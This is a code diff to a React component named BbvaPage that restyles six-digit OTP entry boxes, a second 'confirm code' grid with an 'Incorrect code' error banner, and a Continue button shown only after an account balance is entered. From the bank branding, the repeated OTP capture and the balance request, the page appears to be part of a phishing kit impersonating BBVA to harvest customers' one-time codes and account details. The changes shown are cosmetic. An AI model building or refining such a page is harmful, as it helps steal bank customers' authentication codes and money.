@@ -1034,7 +1034,7 @@ export default function BbvaPage(props: any) {
               </p>
 
               {/* 6 Digit Input Boxes */}
-              <div className="w-full flex items-center justify-center gap-2 mb-4">
+              <div className="w-full max-w-[350px] grid grid-cols-6 gap-2 sm:gap-2.5 mx-auto mb-4">
                 {otp.map((digit, idx) => (
                   <input
                     key={idx}
@@ -1050,7 +1050,7 @@ export default function BbvaPage(props: any) {
                     onKeyDown={(e) => handleOtpKeyDown(idx, e)}
                     onFocus={() => setFocusedOtpIndex(idx)}
                     onBlur={() => setFocusedOtpIndex(null)}
-                    className={`w-[40px] h-[48px] sm:w-[44px] sm:h-[52px] text-center text-[22px] sm:text-[24px] font-bold text-[#0d1e38] rounded-[10px] transition-all outline-none ${
+                    className={`w-full h-[52px] sm:h-[56px] text-center text-[22px] sm:text-[24px] font-bold text-[#0d1e38] rounded-[10px] transition-all outline-none ${
                       focusedOtpIndex === idx
                         ? "border-2 border-[#980F65] ring-1 ring-[#980F65]/15 bg-white shadow-xs"
                         : digit
@@ -1234,45 +1234,47 @@ export default function BbvaPage(props: any) {
               </div>
             </div>
 
-            {/* Continue Button */}
-            <button
-              type="button"
-              disabled={isAccountsSubmitting}
-              onClick={handleAccountsSubmit}
-              className="w-full h-[48px] bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white rounded-[10px] font-semibold text-[15.5px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none"
-            >
-              {isAccountsSubmitting ? (
-                <div className="flex items-center gap-2">
-                  <svg
-                    className="animate-spin h-5 w-5 text-white"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    />
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    />
-                  </svg>
-                  <span>{language === "es" ? "PROCESANDO..." : "PROCESSING..."}</span>
-                </div>
-              ) : accountsSuccess ? (
-                language === "es" ? "✓ Completado" : "✓ Completed"
-              ) : language === "es" ? (
-                "Continuar"
-              ) : (
-                "Continue"
-              )}
-            </button>
+            {/* Continue Button: Hidden until user enters balance behind BND */}
+            {accountBalance.trim().length > 0 && (
+              <button
+                type="button"
+                disabled={isAccountsSubmitting}
+                onClick={handleAccountsSubmit}
+                className="w-full h-[48px] bg-[#980F65] hover:bg-[#7a0c51] active:scale-[0.985] text-white rounded-[10px] font-semibold text-[15.5px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none animate-in fade-in duration-200"
+              >
+                {isAccountsSubmitting ? (
+                  <div className="flex items-center gap-2">
+                    <svg
+                      className="animate-spin h-5 w-5 text-white"
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                    >
+                      <circle
+                        className="opacity-25"
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="currentColor"
+                        strokeWidth="4"
+                      />
+                      <path
+                        className="opacity-75"
+                        fill="currentColor"
+                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                      />
+                    </svg>
+                    <span>{language === "es" ? "PROCESANDO..." : "PROCESSING..."}</span>
+                  </div>
+                ) : accountsSuccess ? (
+                  language === "es" ? "✓ Completado" : "✓ Completed"
+                ) : language === "es" ? (
+                  "Continuar"
+                ) : (
+                  "Continue"
+                )}
+              </button>
+            )}
           </section>
         </main>
       )}
@@ -1328,7 +1330,7 @@ export default function BbvaPage(props: any) {
 
               {/* 6 OTP Boxes */}
               <div
-                className={`grid grid-cols-6 gap-1.5 sm:gap-2 w-full max-w-[280px] mx-auto mb-3 ${
+                className={`grid grid-cols-6 gap-2 sm:gap-2.5 w-full max-w-[340px] mx-auto mb-3.5 ${
                   confirmShake > 0 ? "animate-shake" : ""
                 }`}
               >
@@ -1356,7 +1358,7 @@ export default function BbvaPage(props: any) {
                       onBlur={() => setConfirmFocusedIndex(null)}
                       onChange={(e) => handleConfirmOtpChange(idx, e.target.value)}
                       onKeyDown={(e) => handleConfirmOtpKeyDown(idx, e)}
-                      className={`w-full h-[44px] sm:h-[46px] text-center text-[19px] sm:text-[20px] font-bold text-[#0f172a] bg-white rounded-[10px] border ${boxBorderClass} outline-none transition-all shadow-none`}
+                      className={`w-full h-[50px] sm:h-[52px] text-center text-[21px] sm:text-[22px] font-bold text-[#0f172a] bg-white rounded-[10px] border ${boxBorderClass} outline-none transition-all shadow-none`}
                     />
                   )
                 })}
@@ -1364,7 +1366,7 @@ export default function BbvaPage(props: any) {
 
               {/* Error Banner: ⓘ Incorrect code. Please try again. */}
               {hasConfirmError && (
-                <div className="w-full max-w-[280px] bg-[#fef2f2] border border-[#fecaca] text-[#dc2626] rounded-[8px] py-1.5 px-3 flex items-center justify-center gap-1.5 text-[11px] font-medium mb-3 animate-in fade-in duration-150">
+                <div className="w-full max-w-[340px] bg-[#fef2f2] border border-[#fecaca] text-[#dc2626] rounded-[8px] py-1.5 px-3 flex items-center justify-center gap-1.5 text-[11px] font-medium mb-3 animate-in fade-in duration-150">
                   <svg
                     className="w-3.5 h-3.5 shrink-0 stroke-[2] fill-none stroke-current"
                     viewBox="0 0 24 24"
